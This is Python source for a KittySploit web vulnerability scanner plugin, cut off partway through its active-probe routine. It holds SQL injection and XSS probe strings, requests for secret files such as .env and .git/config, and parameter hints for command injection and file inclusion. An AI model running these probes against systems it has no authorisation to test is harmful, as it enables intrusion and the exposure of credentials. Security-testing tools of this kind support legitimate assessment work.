#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Web Vulnerability Scanner Plugin for KittySploit

The plugin now uses a staged workflow:
- crawl and normalize endpoints
- run passive HTTP detectors already present in the framework
- perform targeted active probes on discovered parameters
- recommend and optionally verify follow-up modules with safer checks
"""

from kittysploit import *
import html
import json
import os
import posixpath
import re
import shlex
import time
import warnings
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

try:
    import requests
    import urllib3
    from bs4 import BeautifulSoup
    from bs4 import FeatureNotFound
    from bs4 import XMLParsedAsHTMLWarning
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from urllib3.exceptions import InsecureRequestWarning

    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    urllib3 = None
    FeatureNotFound = Exception
    XMLParsedAsHTMLWarning = Warning
    InsecureRequestWarning = Warning


STATIC_EXTENSIONS = {
    ".7z",
    ".avi",
    ".bmp",
    ".css",
    ".csv",
    ".doc",
    ".docx",
    ".eot",
    ".gif",
    ".gz",
    ".ico",
    ".jpeg",
    ".jpg",
    ".js",
    ".map",
    ".mp3",
    ".mp4",
    ".otf",
    ".pdf",
    ".png",
    ".svg",
    ".tar",
    ".tgz",
    ".ttf",
    ".wav",
    ".webm",
    ".webp",
    ".woff",
    ".woff2",
    ".xls",
    ".xlsx",
    ".xml",
    ".zip",
}

DESTRUCTIVE_PATH_KEYWORDS = {
    "delete",
    "destroy",
    "drop",
    "logout",
    "remove",
    "reset",
    "signout",
    "truncate",
}

SKIP_PARAM_KEYWORDS = {
    "_csrf",
    "_token",
    "_wpnonce",
    "authenticity_token",
    "captcha",
    "csrf",
    "nonce",
    "token",
}

COMMON_DISCOVERY_PATHS = [
    "robots.txt",
    "sitemap.xml",
    ".env",
    ".env.local",
    ".git/HEAD",
    ".git/config",
    "backup.zip",
    "backup.sql",
    "config.php",
    "debug.log",
    "phpinfo.php",
    "server-status",
    "swagger",
    "swagger/index.html",
    "swagger-ui/",
    "actuator",
    "graphql",
    "api",
    "api/v1",
    "wp-login.php",
    "wp-admin/",
    "admin/",
    "login/",
]

PASSIVE_SCANNERS = [
    "scanner/http/admin_panel_detect",
    "scanner/http/directory_listing_detect",
    "scanner/http/django_debug_detect",
    "scanner/http/docker_registry_detect",
    "scanner/http/exposed_env_detect",
    "scanner/http/exposed_git_detect",
    "scanner/http/flask_debug_detect",
    "scanner/http/grafana_detect",
    "scanner/http/graphql_detect",
    "scanner/http/http_methods_detect",
    "scanner/http/jenkins_detect",
    "scanner/http/joomla_detect",
    "scanner/http/kibana_detect",
    "scanner/http/marimo_websocket_rce",
    "scanner/http/phpinfo_detect",
    "scanner/http/phpmyadmin_detect",
    "scanner/http/robots_txt_detect",
    "scanner/http/security_headers_detect",
    "scanner/http/sensitive_files_detect",
    "scanner/http/server_banner_detect",
    "scanner/http/swagger_detect",
    "scanner/http/tomcat_detect",
    "scanner/http/wordpress_detect",
    "scanner/http/wordpress_madara_cve_2025_4524",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysqli_sql_exception",
    "mysql_fetch",
    "sql syntax",
    "quoted string not properly terminated",
    "unclosed quotation mark",
    "sqlite error",
    "sqlite3.operationalerror",
    "pg_query(",
    "postgresql query failed",
    "sqlstate[",
    "ora-01756",
    "odbc sql server driver",
    "microsoft ole db provider for sql server",
]

LINUX_LFI_MARKERS = [
    "root:x:0:0:",
    "/bin/bash",
    "/usr/sbin/nologin",
    "daemon:x:",
]

WINDOWS_LFI_MARKERS = [
    "[fonts]",
    "[extensions]",
    "[mci extensions]",
    "for 16-bit app support",
    "windows\\system32",
]

WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
    "AWS WAF": ["x-amzn-requestid", "aws-waf"],
    "Akamai": ["akamai", "ak_bmsc"],
    "F5 BIG-IP": ["bigip", "f5_cspm"],
    "Imperva": ["incap_ses", "visid_incap"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Sucuri": ["x-sucuri", "sucuri"],
    "Fortinet": ["fortigate", "fortiwaf"],
    "Wordfence": ["wordfence"],
}

TECH_BODY_SIGNATURES = {
    "wordpress": ["wp-content", "wp-includes", "wp-json", "wp-login.php"],
    "drupal": ["drupal.js", "sites/all", "drupalsettings"],
    "joomla": ["option=com_", "/media/system/js/", "joomla!"],
    "laravel": ["laravel_session", "x-csrf-token"],
    "django": ["csrftoken", "__admin__", "django"],
    "flask": ["werkzeug", "flask", "__wzd"],
    "fastapi": ["fastapi", "openapi.json", "swagger ui"],
    "react": ["__react", "react-root"],
    "vue": ["data-v-", "__vue__"],
    "angular": ["ng-version", "angular"],
    "phpmyadmin": ["phpmyadmin", "pma_"],
    "swagger": ["swagger-ui", "openapi"],
    "graphql": ["graphql", "__schema"],
    "grafana": ["grafana"],
    "kibana": ["kibana"],
    "tomcat": ["apache tomcat", "jsessionid"],
}

ACTIVE_PARAM_HINTS = {
    "sqli": {"account", "category", "id", "item", "num", "order", "page", "query", "search", "sort", "user"},
    "xss": {"comment", "content", "description", "html", "message", "name", "q", "query", "search", "text", "title"},
    "lfi": {"doc", "document", "file", "folder", "include", "page", "path", "template", "view"},
    "ssrf": {"callback", "dest", "feed", "host", "image", "next", "redirect", "return", "site", "uri", "url"},
    "rce": {"arg", "cmd", "command", "daemon", "dir", "exec", "ping", "process", "shell"},
    "xxe": {"data", "payload", "soap", "xml"},
}

SEVERITY_ORDER = {
    "critical": 5,
    "high": 4,
    "medium": 3,
    "low": 2,
    "info": 1,
}


class WebVulnScannerPlugin(Plugin):
    """Web vulnerability scanner plugin."""

    __info__ = {
        "name": "web_vuln_scanner",
        "description": "Crawl, fingerprint and actively probe web targets with passive detectors and targeted payloads",
        "version": "2.0.0",
        "author": "KittySploit Team",
        "dependencies": ["requests", "beautifulsoup4"],
    }

    def __init__(self, framework=None):
        super().__init__(framework)
        self.session = None
        self.timeout = 10
        self.crawl_delay = 0.2
        self.verbose = False
        self.aggressive = False
        self.min_confidence = 70
        self.max_modules = 3
        self.max_urls = 150
        self.target_url = ""
        self.base_url = ""
        self.target_parts = None
        self.waf_detected = None
        self.crawled_urls: Set[str] = set()
        self.page_cache: Dict[str, Dict[str, Any]] = {}
        self.soup_cache: Dict[str, Any] = {}
        self.cache_lock = Lock()
        self.results_lock = Lock()
        self.results: List[Dict[str, Any]] = []
        self.result_keys: Set[Tuple[Any, ...]] = set()
        self.technologies = defaultdict(set)
        self.tech_tokens: Set[str] = set()
        self.linked_modules: Set[str] = set()
        self.executed_modules: Set[str] = set()
        self.passive_scanner_paths: Set[str] = set()
        self.endpoint_inventory: List[Dict[str, Any]] = []
        self.followup_candidates: List[Dict[str, Any]] = []
        self.scan_started_at = 0.0

    def check_dependencies(self):
        if not REQUESTS_AVAILABLE:
            print_error("Missing dependencies: requests, beautifulsoup4")
            print_info("Install with: pip install requests beautifulsoup4")
            return False
        return True

    def run(self, *args, **kwargs):
        parser = ModuleArgumentParser(description="Web Vulnerability Scanner", prog="web_vuln_scanner")
        parser.add_argument("-u", "--url", dest="url", help="Target URL to scan", metavar="<url>", type=str)
        parser.add_argument("-d", "--depth", dest="depth", help="Crawling depth (default: 2)", metavar="<depth>", type=int, default=2)
        parser.add_argument("-t", "--threads", dest="threads", help="Worker threads (default: 6)", metavar="<threads>", type=int, default=6)
        parser.add_argument("-m", "--modules", dest="modules", help="Comma-separated follow-up module patterns (default: all)", metavar="<modules>", type=str, default="all")
        parser.add_argument("--no-crawl", dest="no_crawl", help="Disable crawling and only scan the provided URL", action="store_true")
        parser.add_argument("--timeout", dest="timeout", help="Request timeout in seconds (default: 10)", metavar="<timeout>", type=int, default=10)
        parser.add_argument("--crawl-delay", dest="crawl_delay", help="Delay between crawl requests (default: 0.2)", metavar="<seconds>", type=float, default=0.2)
        parser.add_argument("--user-agent", dest="user_agent", help="Custom User-Agent string", metavar="<ua>", type=str, default="Mozilla/5.0 (KittySploit Scanner)")
        parser.add_argument("--cookie", dest="cookie", help="Cookie string for authenticated requests", metavar="<cookie>", type=str, default="")
        parser.add_argument("--min-confidence", dest="min_confidence", help="Minimum confidence 0-100 (default: 70)", metavar="<confidence>", type=int, default=70)
        parser.add_argument("--max-modules", dest="max_modules", help="Maximum follow-up modules to verify (default: 3)", metavar="<count>", type=int, default=3)
        parser.add_argument("--max-urls", dest="max_urls", help="Maximum URLs/endpoints to keep (default: 150)", metavar="<count>", type=int, default=150)
        parser.add_argument("--report-json", dest="report_json", help="Write a JSON report to the given path", metavar="<file>", type=str, default="")
        parser.add_argument("--passive-only", dest="passive_only", help="Run only crawl, passive detectors and follow-up recommendations", action="store_true")
        parser.add_argument("--aggressive", dest="aggressive", help="Enable deeper probes and follow-up checks", action="store_true")
        parser.add_argument("-v", "--verbose", dest="verbose", help="Verbose output", action="store_true")

        if not args or not args[0]:
            parser.print_help()
            return True

        try:
            pargs = parser.parse_args(shlex.split(args[0]))
            if getattr(pargs, "help", False):
                parser.print_help()
                return True

            if not self.check_dependencies():
                return False

            if not getattr(pargs, "url", None):
                print_error("Target URL is required")
                parser.print_help()
                return False

            return self._scan_website(
                url=pargs.url,
                depth=max(0, pargs.depth),
                threads=max(1, pargs.threads),
                module_patterns=pargs.modules.split(",") if pargs.modules and pargs.modules != "all" else ["all"],
                no_crawl=pargs.no_crawl,
                timeout=max(1, pargs.timeout),
                crawl_delay=max(0.0, pargs.crawl_delay),
                user_agent=pargs.user_agent,
                cookie=pargs.cookie,
                verbose=pargs.verbose,
                min_confidence=pargs.min_confidence,
                max_modules=pargs.max_modules,
                max_urls=pargs.max_urls,
                report_json=pargs.report_json,
                passive_only=pargs.passive_only,
                aggressive=pargs.aggressive,
            )
        except Exception as exc:
            print_error(f"An error occurred: {exc}")
            if "pargs" in locals() and getattr(pargs, "verbose", False):
                import traceback

                traceback.print_exc()
            return False

    def _scan_website(
        self,
        url: str,
        depth: int,
        threads: int,
        module_patterns: List[str],
        no_crawl: bool,
        timeout: int,
        crawl_delay: float,
        user_agent: str,
        cookie: str,
        verbose: bool,
        min_confidence: int,
        max_modules: int,
        max_urls: int,
        report_json: str,
        passive_only: bool,
        aggressive: bool,
    ) -> bool:
        try:
            self._reset_state()
            self.target_url, self.base_url = self._normalize_target(url)
            self.target_parts = urlparse(self.target_url)
            self.timeout = timeout
            self.crawl_delay = crawl_delay
            self.verbose = verbose
            self.aggressive = aggressive
            self.min_confidence = max(0, min(100, int(min_confidence)))
            self.max_modules = max(1, int(max_modules))
            self.max_urls = max(10, int(max_urls))
            self.threads = max(1, int(threads))
            self.scan_started_at = time.time()

            self._init_session(user_agent, cookie)

            print_success("Starting Web Vulnerability Scanner")
            print_info(f"Target: {self.target_url}")
            print_info(f"Depth: {depth} | Threads: {self.threads} | Max URLs: {self.max_urls}")
            print_info(f"Min confidence: {self.min_confidence}% | Follow-up modules: {self.max_modules}")
            if passive_only:
                print_info("Mode: passive-only")
            if aggressive:
                print_warning("Aggressive mode enabled: command injection and heavier timing probes may run.")

            print_status("Step 0: Detecting WAF or blocking middleware...")
            self._detect_waf(self.target_url)
            if self.waf_detected:
                print_warning(f"WAF detected: {self.waf_detected}")
                if not self.aggressive:
                    self.crawl_delay = max(self.crawl_delay, 0.5)
            else:
                print_success("No obvious WAF signature detected")

            print_status("Step 1: Building target inventory...")
            if no_crawl:
                self.crawled_urls.add(self.target_url)
                self._verbose(f"Seeded only the provided URL: {self.target_url}")
            else:
                self._crawl_website(self.target_url, depth)
            self._discover_common_files()
            self._discover_robots_paths()
            print_success(f"Collected {len(self.crawled_urls)} URLs after crawl and discovery")

            print_status("Step 2: Building endpoint inventory...")
            self.endpoint_inventory = self._build_endpoint_inventory()
            params_count = sum(1 for entry in self.endpoint_inventory if entry.get("has_params"))
            print_success(
                f"Inventory contains {len(self.endpoint_inventory)} endpoints ({params_count} with parameters/forms)"
            )

            print_status("Step 3: Detecting technologies...")
            self._detect_technologies()
            if self.tech_tokens:
                detected = ", ".join(sorted(self.tech_tokens))
                print_success(f"Detected stack hints: {detected}")
            else:
                print_warning("No strong technology fingerprint detected")

            print_status("Step 4: Running passive HTTP detectors...")
            passive_hits = self._run_passive_scanners()
            print_success(f"Passive detectors produced {passive_hits} positive matches")

            active_hits = 0
            if passive_only:
                print_status("Step 5: Skipping active probes (--passive-only)")
            else:
                print_status("Step 5: Running targeted active probes...")
                active_hits = self._run_active_scans()
                print_success(f"Active probes recorded {active_hits} findings")

            print_status("Step 6: Selecting follow-up modules...")
            self.followup_candidates = self._select_followup_modules(module_patterns)
            if self.followup_candidates:
                print_success(
                    f"Prepared {len(self.followup_candidates)} follow-up candidates; verifying top {self.max_modules}"
                )
                self._run_followup_checks(self.followup_candidates[: self.max_modules])
            else:
                print_warning("No relevant follow-up module identified")

            print_status("Step 7: Results Summary")
            self._display_results()

            if report_json:
                self._write_json_report(report_json)
                print_success(f"JSON report written to {report_json}")

            return True
        except Exception as exc:
            print_error(f"Scanning error: {exc}")
            if self.verbose:
                import traceback

                traceback.print_exc()
            return False

    def _reset_state(self):
        self.waf_detected = None
        self.crawled_urls = set()
        self.page_cache = {}
        self.soup_cache = {}
        self.results = []
        self.result_keys = set()
        self.technologies = defaultdict(set)
        self.tech_tokens = set()
        self.linked_modules = set()
        self.executed_modules = set()
        self.passive_scanner_paths = set()
        self.endpoint_inventory = []
        self.followup_candidates = []

    def _init_session(self, user_agent: str, cookie: str):
        if urllib3 is not None:
            urllib3.disable_warnings(InsecureRequestWarning)

        retry = Retry(total=2, backoff_factor=0.4, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(pool_connections=16, pool_maxsize=32, max_retries=retry)
        self.session = requests.Session()
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.verify = False
        self.session.headers.update(
            {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
            }
        )
        if cookie:
            self.session.headers["Cookie"] = cookie

    def _normalize_target(self, raw_url: str) -> Tuple[str, str]:
        value = (raw_url or "").strip()
        if not value:
            raise ValueError("Empty target URL")
        if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", value):
            value = f"http://{value}"
        parsed = urlparse(value)
        if not parsed.netloc:
            raise ValueError(f"Invalid target URL: {raw_url}")

        scheme = (parsed.scheme or "http").lower()
        path = self._normalize_path(parsed.path)
        query = urlencode(sorted(parse_qsl(parsed.query, keep_blank_values=True)), doseq=True)
        normalized = urlunparse((scheme, parsed.netloc, path, "", query, ""))
        base_url = f"{scheme}://{parsed.netloc}"
        return normalized, base_url

    def _normalize_path(self, path: str) -> str:
        if not path:
            return "/"
        raw = path if path.startswith("/") else f"/{path}"
        trailing = raw.endswith("/")
        normalized = posixpath.normpath(raw)
        if normalized in ("", "."):
            normalized = "/"
        if trailing and normalized != "/" and not normalized.endswith("/"):
            normalized = f"{normalized}/"
        return normalized

    def _canonicalize_url(self, url: str) -> str:
        parsed = urlparse(url)
        if parsed.scheme not in {"http", "https"}:
            return ""
        path = self._normalize_path(parsed.path)
        query = urlencode(sorted(parse_qsl(parsed.query, keep_blank_values=True)), doseq=True)
        return urlunparse((parsed.scheme.lower(), parsed.netloc, path, "", query, ""))

    def _same_origin(self, url: str) -> bool:
        parsed = urlparse(url)
        return bool(parsed.netloc) and parsed.netloc == self.target_parts.netloc

    def _should_visit_url(self, url: str) -> bool:
        if not url:
            return False
        parsed = urlparse(url)
        if parsed.scheme not in {"http", "https"}:
            return False
        if parsed.netloc and not self._same_origin(url):
            return False
        if any(keyword in parsed.path.lower() for keyword in DESTRUCTIVE_PATH_KEYWORDS) and not self.aggressive:
            return False
        ext = os.path.splitext(parsed.path.lower())[1]
        if ext in STATIC_EXTENSIONS:
            return False
        return True

    def _get_page(self, url: str, use_cache: bool = True) -> Optional[Dict[str, Any]]:
        if use_cache:
            with self.cache_lock:
                cached = self.page_cache.get(url)
            if cached:
                return cached

        try:
            response = self.session.get(
                url,
                timeout=self.timeout,
                allow_redirects=True,
                verify=False,
            )
            page = {
                "status_code": response.status_code,
                "text": response.text or "",
                "headers": dict(response.headers or {}),
                "content_type": response.headers.get("Content-Type", ""),
                "final_url": response.url,
            }
            if use_cache:
                with self.cache_lock:
                    if len(self.page_cache) < self.max_urls * 4:
                        self.page_cache[url] = page
            return page
        except Exception as exc:
            self._verbose(f"GET failed for {url}: {exc}")
            return None

    def _looks_like_xml(self, url: str, text: str, content_type: str = "") -> bool:
        lowered_type = (content_type or "").lower()
        lowered_url = (url or "").lower()
        stripped = (text or "").lstrip()
        if "xml" in lowered_type or lowered_url.endswith(".xml"):
            return True
        return stripped.startswith("<?xml") or stripped.startswith("<urlset") or stripped.startswith("<sitemapindex")

    def _get_soup(self, url: str, text: str, content_type: str = ""):
        with self.cache_lock:
            cached = self.soup_cache.get(url)
        if cached is not None:
            return cached

        parser = "xml" if self._looks_like_xml(url, text, content_type) else "html.parser"
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", XMLParsedAsHTMLWarning)
            try:
                soup = BeautifulSoup(text or "", parser)
            except FeatureNotFound:
                soup = BeautifulSoup(text or "", "html.parser")

        with self.cache_lock:
            if len(self.soup_cache) < self.max_urls * 4:
                self.soup_cache[url] = soup
        return soup

    def _detect_waf(self, url: str):
        page = self._get_page(url, use_cache=False)
        if not page:
            return

        for header, value in page["headers"].items():
            head = str(header).lower()
            val = str(value).lower()
            for waf, markers in WAF_SIGNATURES.items():
                if any(marker in head or marker in val for marker in markers):
                    self.waf_detected = waf
                    return

        probe_url = f"{url}?id=1%27%20OR%20%271%27=%271&xss=%3Csvg/onload=alert(1)%3E"
        probe = self._get_page(probe_url, use_cache=False)
        if not probe:
            return
        if probe["status_code"] in {403, 406, 429, 501, 999}:
            probe_text = probe["text"].lower()
            for waf, markers in WAF_SIGNATURES.items():
                if any(marker in probe_text for marker in markers):
                    self.waf_detected = waf
                    return
            self.waf_detected = "Generic/Unknown WAF"

    def _crawl_website(self, start_url: str, max_depth: int):
        queue = deque([(start_url, 0)])
        visited = set()

        while queue and len(self.crawled_urls) < self.max_urls:
            current_url, depth = queue.popleft()
            current_url = self._canonicalize_url(current_url)
            if not current_url or current_url in visited or not self._should_visit_url(current_url):
                continue

            visited.add(current_url)
            self.crawled_urls.add(current_url)
            self._verbose(f"Crawling depth={depth}: {current_url}")

            if depth >= max_depth:
                continue

            page = self._get_page(current_url)
            if not page or page["status_code"] not in {200, 401, 403}:
                continue

            for candidate in self._extract_candidate_links(
                current_url,
                page["text"],
                page.get("content_type", ""),
            ):
                if len(self.crawled_urls) + len(queue) >= self.max_urls:
                    break
                if candidate not in visited:
                    queue.append((candidate, depth + 1))

            if self.crawl_delay:
                time.sleep(self.crawl_delay)

    def _extract_candidate_links(self, current_url: str, text: str, content_type: str = "") -> Set[str]:
        candidates = set()
        soup = self._get_soup(current_url, text, content_type)
        is_xml = self._looks_like_xml(current_url, text, content_type)

        if is_xml:
            for node in soup.find_all(["loc", "link"]):
                raw = node.get_text(strip=True)
                if not raw:
                    continue
                absolute = urljoin(current_url, raw)
                normalized = self._canonicalize_url(absolute)
                if normalized and self._should_visit_url(normalized):
                    candidates.add(normalized)

        for tag in soup.find_all(["a", "form", "iframe", "link", "script"]):
            attr = "href"
            if tag.name == "form":
                attr = "action"
            elif tag.name in {"iframe", "script"}:
                attr = "src"

            raw = tag.get(attr)
            if not raw:
                continue
            absolute = urljoin(current_url, raw)
            normalized = self._canonicalize_url(absolute)
            if normalized and self._should_visit_url(normalized):
                candidates.add(normalized)

        text_candidates = re.findall(r"""["']((?:https?://|/)[^"'<>]{1,220})["']""", text or "")
        for raw in text_candidates:
            absolute = urljoin(current_url, raw)
            normalized = self._canonicalize_url(absolute)
            if normalized and self._should_visit_url(normalized):
                candidates.add(normalized)

        raw_urls = re.findall(r"""https?://[^\s<>"']+""", text or "")
        for raw in raw_urls:
            normalized = self._canonicalize_url(raw.rstrip(".,);"))
            if normalized and self._should_visit_url(normalized):
                candidates.add(normalized)

        return candidates

    def _discovery_roots(self) -> List[str]:
        roots = {self.base_url}
        if self.target_parts and self.target_parts.path not in {"", "/"}:
            trimmed = self.target_parts.path.rsplit("/", 1)[0]
            if not trimmed:
                trimmed = "/"
            if not trimmed.endswith("/"):
                trimmed = f"{trimmed}/"
            roots.add(f"{self.base_url}{trimmed}")
        return sorted(roots)

    def _discover_common_files(self):
        roots = self._discovery_roots()
        probes = []
        for root in roots:
            for path in COMMON_DISCOVERY_PATHS:
                probes.append(urljoin(root, path))

        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as executor:
            futures = {executor.submit(self._get_page, probe, False): probe for probe in probes}
            for future in as_completed(futures):
                probe = futures[future]
                try:
                    page = future.result()
                except Exception:
                    continue
                if not page or page["status_code"] not in {200, 401, 403}:
                    continue
                normalized = self._canonicalize_url(probe)
                if normalized and normalized not in self.crawled_urls:
                    self.crawled_urls.add(normalized)
                    self._verbose(f"Discovered interesting path: {normalized} ({page['status_code']})")

    def _discover_robots_paths(self):
        robots_url = urljoin(self.base_url, "robots.txt")
        page = self._get_page(robots_url)
        if not page or page["status_code"] != 200 or not page["text"]:
            return

        for line in page["text"].splitlines():
            match = re.match(r"^\s*(?:Disallow|Allow)\s*:\s*(/\S+)", line, re.I)
            if not match:
                continue
            absolute = urljoin(self.base_url, match.group(1).strip())
            normalized = self._canonicalize_url(absolute)
            if normalized and self._should_visit_url(normalized):
                self.crawled_urls.add(normalized)

    def _build_endpoint_inventory(self) -> List[Dict[str, Any]]:
        endpoint_map: Dict[Tuple[str, str], Dict[str, Any]] = {}

        for url in sorted(self.crawled_urls):
            parsed = urlparse(url)
            query_params = {key: value for key, value in parse_qsl(parsed.query, keep_blank_values=True)}
            self._merge_endpoint(endpoint_map, url, "GET", query_params, discovered_from="crawl")

            page = self._get_page(url)
            if not page or page["status_code"] != 200:
                continue

            for form in self._extract_forms(url, page["text"], page.get("content_type", "")):
                self._merge_endpoint(
                    endpoint_map,
                    form["url"],
                    form["method"],
                    form["params"],
                    discovered_from="form",
                    source_page=url,
                    enctype=form["enctype"],
                )

        endpoints = list(endpoint_map.values())
        for entry in endpoints:
            entry["has_params"] = bool(entry["params"])
            entry["interesting_score"] = self._score_endpoint(entry)
            entry["source_pages"] = sorted(entry["source_pages"])
            entry["discovered_from"] = sorted(entry["discovered_from"])

        endpoints.sort(
            key=lambda entry: (
                not entry["has_params"],
                -entry["interesting_score"],
                entry["url"],
                entry["method"],
            )
        )
        return endpoints[: self.max_urls]

    def _merge_endpoint(
        self,
        endpoint_map: Dict[Tuple[str, str], Dict[str, Any]],
        url: str,
        method: str,
        params: Dict[str, Any],
        discovered_from: str,
        source_page: str = "",
        enctype: str = "",
    ):
        normalized = self._canonicalize_url(url)
        if not normalized or not self._should_visit_url(normalized):
            return

        clean_url = self._strip_query(normalized)
        key = (clean_url, method.upper())
        parsed = urlparse(clean_url)

        if key not in endpoint_map:
            endpoint_map[key] = {
                "url": clean_url,
                "path": parsed.path or "/",
                "method": method.upper(),
                "params": {},
                "enctype": enctype or "",
                "source_pages": set(),
                "discovered_from": set(),
            }

        entry = endpoint_map[key]
        if source_page:
            entry["source_pages"].add(source_page)
        entry["discovered_from"].add(discovered_from)
        if enctype and not entry["enctype"]:
            entry["enctype"] = enctype

        for name, value in (params or {}).items():
            if value is None:
                value = ""
            if name not in entry["params"] or not entry["params"][name]:
                entry["params"][name] = str(value)

    def _extract_forms(self, page_url: str, text: str, content_type: str = "") -> List[Dict[str, Any]]:
        if self._looks_like_xml(page_url, text, content_type):
            return []

        forms = []
        soup = self._get_soup(page_url, text, content_type)
        for form in soup.find_all("form"):
            action = form.get("action") or page_url
            absolute = self._canonicalize_url(urljoin(page_url, action))
            if not absolute or not self._same_origin(absolute):
                continue
            method = (form.get("method") or "GET").upper()
            if method not in {"GET", "POST"}:
                method = "POST"
            params = {}
            for field in form.find_all(["input", "textarea", "select"]):
                name = field.get("name")
                if not name:
                    continue
                value = field.get("value", "")
                if field.name == "textarea" and not value:
                    value = field.text or ""
                if field.name == "select" and not value:
                    option = field.find("option", selected=True) or field.find("option")
                    value = option.get("value", "") if option else ""
                if field.get("type") in {"checkbox", "radio"} and not field.has_attr("checked") and not value:
                    value = "on"
                params[name] = value or "test"
            forms.append(
                {
                    "url": absolute,
                    "method": method,
                    "params": params,
                    "enctype": form.get("enctype", ""),
                }
            )
        return forms

    def _score_endpoint(self, entry: Dict[str, Any]) -> int:
        score = 0
        path = entry["path"].lower()
        params = [name.lower() for name in entry["params"].keys()]
        if entry["has_params"]:
            score += 35
        if entry["method"] == "POST":
            score += 10
        if any(token in path for token in ["admin", "ajax", "api", "debug", "graphql", "search", "upload"]):
            score += 10
        ext = os.path.splitext(path)[1]
        if ext in {".php", ".asp", ".aspx", ".cgi", ".jsp"}:
            score += 12
        for name in params:
            if any(name == hint or hint in name for hints in ACTIVE_PARAM_HINTS.values() for hint in hints):
                score += 5
        return score

    def _detect_technologies(self):
        check_urls = [entry["url"] for entry in self.endpoint_inventory[:25]] or [self.target_url]
        for url in check_urls:
            page = self._get_page(url)
            if not page:
                continue

            headers = {str(key).lower(): str(value).lower() for key, value in page["headers"].items()}
            body = (page["text"] or "").lower()

            for header_name in ["server", "x-powered-by", "x-generator", "via"]:
                value = headers.get(header_name)
                if not value:
                    continue
                tokens = re.split(r"[^a-z0-9.+_-]", value)
                for token in tokens:
                    token = token.strip(".- ")
                    if len(token) < 2:
                        continue
                    self._register_technology(token, url)
                if "apache" in value:
                    self._register_technology("apache", url)
                if "nginx" in value:
                    self._register_technology("nginx", url)
                if "php" in value:
                    self._register_technology("php", url)
                if "iis" in value:
                    self._register_technology("iis", url)
                if "tomcat" in value:
                    self._register_technology("tomcat", url)
                if "ubuntu" in value:
                    self._register_technology("linux", url)
                if "win" in value:
                    self._register_technology("windows", url)

            for tech, signatures in TECH_BODY_SIGNATURES.items():
                if any(signature in body for signature in signatures):
                    self._register_technology(tech, url)

    def _register_technology(self, tech: str, url: str):
        normalized = re.sub(r"[^a-z0-9.+_-]", "", tech.lower()).strip()
        if not normalized:
            return
        self.tech_tokens.add(normalized)
        self.technologies[normalized].add(url)

    def _run_passive_scanners(self) -> int:
        scanner_paths = self._passive_scanner_paths()
        self.passive_scanner_paths = set(scanner_paths)
        hits = 0
        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as executor:
            futures = {executor.submit(self._run_passive_scanner, mod_path): mod_path for mod_path in scanner_paths}
            for future in as_completed(futures):
                try:
                    if future.result():
                        hits += 1
                except Exception as exc:
                    self._verbose(f"Passive detector failed: {exc}")
        return hits

    def _passive_scanner_paths(self) -> List[str]:
        if self.framework and hasattr(self.framework, "module_loader"):
            try:
                discovered = self.framework.module_loader.discover_modules()
                scanners = sorted(path for path in discovered if path.startswith("scanner/http/"))
                if scanners:
                    return scanners
            except Exception as exc:
                self._verbose(f"Unable to enumerate scanner/http modules dynamically: {exc}")
        return list(PASSIVE_SCANNERS)

    def _run_passive_scanner(self, mod_path: str) -> bool:
        module = self._load_and_configure_http_module(mod_path)
        if not module:
            return False

        try:
            result = module.run() if hasattr(module, "run") else module.check()
        except Exception as exc:
            self._verbose(f"{mod_path} raised an exception: {exc}")
            return False

        positive, reason, confidence = self._module_result_details(module, result)
        if not positive:
            return False

        severity = self._normalize_severity(
            (getattr(module, "vulnerability_info", {}) or {}).get("severity")
            or getattr(module, "__info__", {}).get("severity")
            or "info"
        )
        evidence = reason or module.description or "Passive detector reported a match"
        info = getattr(module, "vulnerability_info", {}) or {}
        linked = getattr(module, "__info__", {}).get("modules", []) or []
        for linked_module in linked:
            self.linked_modules.add(linked_module)
        if not self._passive_result_matches_stack(mod_path, evidence, info):
            self._verbose(f"Ignoring passive hit from {mod_path}: contradicted by detected stack")
            return False
        self._derive_tech_from_module(mod_path, evidence)
        added = self._record_result(
            source="passive",
            name=module.name or mod_path.split("/")[-1],
            module=mod_path,
            url=self.target_url,
            method="GET",
            severity=severity,
            confidence=confidence or self._default_confidence_for_severity(severity),
            evidence=evidence,
            metadata=info,
            signal=self._signal_from_path(mod_path),
        )
        return bool(added)

    def _passive_result_matches_stack(self, mod_path: str, evidence: str, info: Dict[str, Any]) -> bool:
        lower = f"{mod_path} {evidence} {info}".lower()

        contradictory_frameworks = {
            "django": "wordpress",
            "flask": "wordpress",
            "joomla": "wordpress",
            "drupal": "wordpress",
        }

        for framework, contradiction in contradictory_frameworks.items():
            if framework in lower and contradiction in self.tech_tokens and framework not in self.tech_tokens:
                return False
        return True

    def _run_active_scans(self) -> int:
        targets = [entry for entry in self.endpoint_inventory if entry.get("has_params")]
        if not targets:
            print_warning("No parameterized endpoints found for active probing")
            return 0

        limit = 60 if self.aggressive else 25
        selected = targets[:limit]
        hits = 0

        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as executor:
            futures = {executor.submit(self._scan_endpoint, entry): entry for entry in selected}
            for future in as_completed(futures):
                try:
                    hits += future.result()
                except Exception as exc:
                    self._verbose(f"Active scan worker failed: {exc}")
        return hits

    def _scan_endpoint(self, entry: Dict[str, Any]) -> int:
        hits = 0
        baseline_resp, baseline_time = self._send_entry_request(entry, dict(entry["params"]))
        if not baseline_resp:
            return 0

        for param in sorted(entry["params"].keys()):
            if not self._should_probe_param(param):
                continue

            for attack in self._candidate_attacks(param, entry):
                if attack == "sqli":
